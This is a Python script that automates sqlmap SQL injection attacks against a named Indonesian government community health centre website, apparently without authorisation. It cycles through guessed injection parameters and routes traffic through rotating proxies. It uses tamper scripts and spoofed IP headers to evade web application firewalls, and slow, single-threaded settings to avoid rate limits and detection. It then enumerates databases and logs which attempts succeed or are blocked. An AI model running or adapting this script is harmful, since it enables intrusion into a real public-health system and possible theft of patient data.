import requests
import socks
import socket
import sys
import random
import time
import subprocess
import threading
import os

# --- CONFIGURATION ---
TARGET_URL = "https://puskesjaten1.karanganyarkab.go.id"
SQLMAP_PATH = "python sqlmap.py"
TAMPER_SCRIPTS = "space2comment,between,randomcase,space2plus"
PROXY_FILE = "proxies.txt"

def banner():
    print("""
    ╔══════════════════════════════════════╗
    ║      PUSKESMAS JATEN SQLI HUNTER     ║
    ║   Target: puskesjaten1 (Proxy Rotation) ║
    ╚══════════════════════════════════════╝
    """)

def run_sqli_scan():
    if not os.path.exists(PROXY_FILE):
        print(f"[!] Error: {PROXY_FILE} not found!")
        return

    print(f"\n[+] Starting SQL Injection with Proxy Rotation from: {PROXY_FILE}")
    
    # 1. Define Injection Points
    targets = [
        f"{TARGET_URL}/?id=1",
        f"{TARGET_URL}/?p=1",
        f"{TARGET_URL}/?page_id=1",
        f"{TARGET_URL}/index.php?id=1",
        f"{TARGET_URL}/news.php?id=1"
    ]
    
    print(f"[*] Loaded {len(targets)} potential injection points.")
    
    for url in targets:
        print(f"\n[>] Attacking: {url}")
        
        # Construct SQLMap Command with Proxy File
        cmd = [
            sys.executable, "sqlmap.py",
            "-u", url,
            "--proxy-file", PROXY_FILE,  # Rotate proxies automatically
            "--tamper", TAMPER_SCRIPTS,
            "--level=5", "--risk=3",
            "--random-agent",
            "--headers=X-Originating-IP: 127.0.0.1\\nX-Remote-IP: 127.0.0.1\\nX-Client-IP: 127.0.0.1", # WAF Bypass detected
            "--delay=2",                 # "Low & Slow" - 2s delay between requests
            "--time-sec=10",             # "Low & Slow" - Increase timeout for time-based checks
            "--batch", "--threads=1",    # "Low & Slow" - Single threaded to avoid Rate Limit/TCP Reset
            "--timeout=15",              # Allow more time for slow proxies
            "--retries=3",               # Retry more often
            "--dbs" 
        ]
        
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Testing {url}\n"
        
        try:
            # Run SQLMap and capture output for analysis
            process = subprocess.Popen(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                encoding='utf-8',
                errors='ignore'
            )
            
            output = ""
            for line in process.stdout:
                print(line, end='') # Live output to console
                output += line
            
            process.wait()
            
            # Analyze Output
            status = "UNKNOWN"
            note = ""
            
            if "is vulnerable" in output or "appears to be" in output or "injectable" in output:
                status = "SUCCESS"
                note = "Vulnerability Confirmed!"
            elif "Connection reset" in output or "Connection refused" in output:
                status = "BLOCKED_L2"
                note = "TCP Reset (Hardware WAF/IPS)"
            elif "403 Forbidden" in output or "406 Not Acceptable" in output:
                status = "BLOCKED_L1"
                note = "HTTP Block (Nginx/ModSecurity)"
            elif "heuristics detected" in output:
                status = "PARTIAL"
                note = "Heuristics detected something, but likely blocked."
            else:
                status = "FAILED"
                note = "No clear injection point found."

            log_entry += f"Status: {status}\nNote: {note}\n"
            log_entry += "-" * 40 + "\n"
            
            with open("fuzz_report.txt", "a", encoding="utf-8") as f:
                f.write(log_entry)
                
        except Exception as e:
            print(f"[!] Critical Error: {e}")
            with open("fuzz_report.txt", "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] Error testing {url}: {e}\n")

if __name__ == "__main__":
    banner()
    run_sqli_scan()
